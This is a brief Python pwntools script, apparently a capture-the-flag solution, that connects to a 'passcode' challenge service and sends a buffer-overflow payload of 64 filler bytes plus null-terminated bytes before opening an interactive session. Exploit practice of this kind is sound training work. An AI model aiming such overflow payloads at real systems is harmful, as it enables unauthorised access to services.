#!/usr/bin/env python3

from pwn import *

exe = ELF("./passcode_patched")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("passcode.challs.havce.it", 1340)

    return r


def main():
    r = conn()

    r.sendline(b"A" * 64 + b"x\00" * 4)

    r.interactive()


if __name__ == "__main__":
    main()
